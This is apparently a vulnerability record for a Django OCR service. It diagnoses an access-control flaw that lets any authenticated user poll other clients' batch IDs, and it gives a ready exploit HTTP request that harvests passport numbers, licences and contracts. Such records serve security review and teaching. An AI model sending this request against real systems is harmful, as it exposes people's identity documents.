diagnosis: get_ocr_batch_status fetches django-q task results grouped by group_id. The endpoint fails to verify if the requesting user initiated the batch processing group, allowing any authenticated user to poll arbitrary group IDs and harvest OCR-extracted text containing passport numbers, driver's licenses, and signed legal contracts processed for other clients.
exploit_request:
GET /api/documents/batches/OCR_BATCH_CLIENT_9921/status/ HTTP/1.1
Host: ocr-engine.legalcloud.io
Authorization: Token client_88_token
Accept: application/json
